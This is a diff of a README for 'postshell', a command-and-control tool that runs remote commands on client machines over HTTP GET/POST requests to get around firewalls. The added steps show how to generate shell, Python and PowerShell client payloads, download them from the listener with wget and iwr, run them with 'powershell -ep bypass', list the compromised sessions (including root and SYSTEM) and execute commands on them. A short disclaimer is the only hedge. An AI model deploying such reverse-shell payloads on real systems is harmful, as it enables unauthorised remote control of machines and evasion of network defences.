@@ -11,13 +11,13 @@ Execute commands on clients using GET/POST requests. (Bypass Firewalls for initi
 There are some limitations, however, can be very useful if firewall is blocking standard reverse shells.
 
 How postshell works:
-  - Listens for http requests on user specified port
-  - Generates a web request script (sh, py, ps1)
+  - Listens for http requests on a user specified port
+  - Generates a web request script `(sh, py, ps1)`
   - Client scripts connect to the server using POST requests, submitting machine information
   - Client scripts continue to GET commands from the server, execute the commands, then POST results back to the server 
 
 # Disclaimer
-This is not meant to be used for illegal purposes. Use at your own risk.
+This is not meant to be used for illegal purposes. Use at your own risk and authorized machines.
 
 # Getting Started
 1. Download POSTSHELL
@@ -31,62 +31,90 @@ git clone https://github.com/bwithe/postshell
 python3 postshell.py <port>
 ```
 
-2. Modify the following, then transfer a client.<script> to connect to the SERVER
-  - IP
-  - PORT
-  - WAITTIME
-
-3. Execute the script on the client
+2. Generate a Client script that creates a directory called "tools" with the scripts
+  - This server also allows GET requests from "tools"
 ```
-bash client.sh
+postshell> payload 
+payload> options 
 
-python3 client.py
+Current Payload Options:
 
-powershell -ep bypass client.ps1
+  LHOST     : 127.0.0.1
+  LPORT     : 80
+  PAYLOAD   : sh
+  CHECKIN   : 1
+
+payload> set lhost 127.0.0.1
+[+] Set lhost to 127.0.0.1
+payload> set lport 80
+[+] Set lport to 80
+payload> set payload sh
+[+] Set payload to sh
+payload> set checkin 1
+[+] Set checkin to 1
+payload> generate 
+[+] Payload generated and saved as tools/127_0_0_1_80.sh
+```
+3. Transfer the client script
+```
+wget http://127.0.0.1:80/tools/127_0_0_1_80.sh
+
+wget http://127.0.0.1:80/tools/127_0_0_1_80.py
+
+iwr http://127.0.0.1:80/tools/127_0_0_1_80.ps1 -outfile 127_0_0_1_80.ps1
 ```
 
-4. To see active clients
+4. Execute the script on the client
+```
+bash 127_0_0_1_80.sh
+
+python3 127_0_0_1_80.py
+
+powershell -ep bypass 127_0_0_1_80.ps1
+```
+
+5. To see active clients
 ```
 postshell> list 
 ╔════╦═════════════════╦═════════════════╦═════════╦════════════════╦══════════════════╦════════╗
 ║ ID ║ IP              ║ HOSTNAME        ║ USER    ║ OS             ║ VERSION          ║ ARCH   ║
 ╠════╬═════════════════╬═════════════════╬═════════╬════════════════╬══════════════════╬════════╣
-║ 1  ║ 192.168.193.131 ║ ubuntu          ║ ubuntu  ║ Linux          ║ 6.8.0-41-generic ║        ║
-║ 2  ║ 192.168.193.131 ║ ubuntu          ║ root    ║ Linux          ║ 6.8.0-41-generic ║        ║
+║ 1  ║ 192.168.193.131 ║ ubuntu          ║ clyde   ║ Linux          ║ 6.8.0-41-generic ║ x86_64 ║
+║ 2  ║ 192.168.193.131 ║ ubuntu          ║ root    ║ Linux          ║ 6.8.0-41-generic ║ x86_64 ║
 ║ 3  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ jimothy ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
 ║ 4  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ system  ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
 ╚════╩═════════════════╩═════════════════╩═════════╩════════════════╩══════════════════╩════════╝
 ```
 
-5. To connect to an active session
+6. To connect to an active session
 ```
 postshell> select 3
 [jimothy@DESKTOP-P5KACDB]>
 ```
 
-6. Execute commands, and wait for the client to GET the command, then POST the results
+7. Execute commands, and wait for the client to GET the command, then POST the results
 ```
 [jimothy@DESKTOP-P5KACDB]> pwd
 C:\Users\jimothy\Downloads
 ```
   
-7. To background a session
+8. To background a session
 ```
 [jimothy@DESKTOP-P5KACDB]> background
 ```
 
-8. To kill the current session
+9. To kill the current session
 ```
 [jimothy@DESKTOP-P5KACDB]> die
 ```
 
-9. Kill an active session from the menu
+10. Kill an active session from the menu
 ```
 postshell> kill 3
 [!] Sent kill command to jimothy@DESKTOP-P5KACDB
 ```
 
-10. To kill all sessions, and exit POSTSHELL
+11. To kill all sessions, and exit POSTSHELL
 ```
 postshell> exit 
 [!] Shutting down server and all sessions.
